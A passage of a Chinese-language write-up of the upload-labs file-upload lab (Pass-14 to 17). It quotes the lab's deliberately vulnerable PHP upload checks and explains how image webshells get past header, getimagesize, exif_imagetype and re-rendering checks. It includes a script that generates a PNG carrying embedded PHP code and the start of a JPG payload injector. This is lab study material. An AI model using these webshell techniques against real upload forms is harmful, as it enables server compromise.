class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题在上一题的基础上增加了文件头校验，它读取了文件开头两个字节，校验文件头是否符合。所以本题，我们构建图片马，然后利用靶机有的文件执行漏洞执行上传的图片马文件</p></li><li><p>绕过：<br>首先构造图片马，构造好后用burp抓包上传，从response里面可以找到上传路径，然后题目说利用文件执行漏洞检测上传的图片马，文件利用漏洞文件在主目录下的<code>include.php</code>中，利用该漏洞访问的文件，都会被当成php文件执行，不论什么类型</p></li></ul><h3 id="15-Pass-15（图片马getimagesize函数）"><a href="#15-Pass-15（图片马getimagesize函数）" class="headerlink" title="15. Pass-15（图片马getimagesize函数）"></a>15. Pass-15（图片马getimagesize函数）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源代码，它会从文件的16进制中获取文件的类型信息而不是通过后缀名，然后和白名单的后缀名进行比对，如果相等，就可以上传。</p></li><li><p>绕过：</p><p>这一次，我们不能单单只构造符合的文件头，那是要用真正的图片来制作图片马，这样<code>getimagesize</code>才会获得相应的文件类型。其他的步骤和上题一样</p></li></ul><h3 id="16-Pass-16（图片马-PHP内置函数exif-imagetype）"><a href="#16-Pass-16（图片马-PHP内置函数exif-imagetype）" class="headerlink" title="16. Pass-16（图片马 PHP内置函数exif_imagetype）"></a>16. Pass-16（图片马 PHP内置函数exif_imagetype）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = UPLOAD_PATH.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题和上题一样，只不过将校验文件类型的部分换成了php内置函数exif_imagetype</p></li><li><p>绕过：<br>绕过方法不变，依旧是使用真正的图片在后面添加一句话木马构造图片马。</p></li></ul><h3 id="17-Pass-17（二次渲染绕过）"><a href="#17-Pass-17（二次渲染绕过）" class="headerlink" title="17. Pass-17（二次渲染绕过）"></a>17. Pass-17（二次渲染绕过）</h3><ul><li><p>分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    $filename = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $filetype = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $tmpname = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line"></span><br><span class="line">    $target_path=UPLOAD_PATH.<span class="string">'/'</span>.basename($filename);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    $fileext= substr(strrchr($filename,<span class="string">"."</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>(($fileext == <span class="string">"jpg"</span>) &amp;&amp; ($filetype==<span class="string">"image/jpeg"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromjpeg($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是jpg格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".jpg"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagejpeg($im,$img_path);</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"png"</span>) &amp;&amp; ($filetype==<span class="string">"image/png"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefrompng($target_path);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是png格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".png"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagepng($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(($fileext == <span class="string">"gif"</span>) &amp;&amp; ($filetype==<span class="string">"image/gif"</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($tmpname,$target_path))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            $im = imagecreatefromgif($target_path);</span><br><span class="line">            <span class="keyword">if</span>($im == <span class="keyword">false</span>)&#123;</span><br><span class="line">                $msg = <span class="string">"该文件不是gif格式的图片！"</span>;</span><br><span class="line">                @unlink($target_path);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                $newfilename = strval(rand()).<span class="string">".gif"</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$newfilename;</span><br><span class="line">                imagegif($im,$img_path);</span><br><span class="line"></span><br><span class="line">                @unlink($target_path);</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析源代码，发现本题最大的问题是图片的二次渲染问题。图片经过二次渲染后，2进制流会发生变化，我们之前添加的一句话语句也会被修改删除，无法正常执行。</p></li><li><p>绕过：<br>本次绕过方法参考： <span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjY1Nw==" title="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657<i class="fa fa-external-link"></i></span> </p><ol><li><p>上传gif：<br>上传gif最简单，首先上传一个正常的gif，然后将经过二次渲染的新gif下载到本地，用16进制编辑器打开，然后比对两个gif没有改变的区域，在这个区域插入一句话木马即可。</p></li><li><p>上传png：</p><p>构造可绕过二次渲染的png木马有两种方法：</p><ul><li><p>写入png图片的PLTE数据块：<br>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p></li><li><p>写入IDTA数据块：<br>这里有国外大牛写的脚本,直接拿来运行即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$p = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$img = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($y = <span class="number">0</span>; $y &lt; sizeof($p); $y += <span class="number">3</span>) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+<span class="number">1</span>];</span><br><span class="line">   $b = $p[$y+<span class="number">2</span>];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / <span class="number">3</span>), <span class="number">0</span>, $color);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng($img,<span class="string">'./shell.png'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用php运行该脚本后就可以得到shell.png，一个构造好的png木马，上传即可</p></li></ul></li><li><p>上传jpg：<br>采用国外大牛编写的脚本jpg_payload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">"&lt;?=phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span 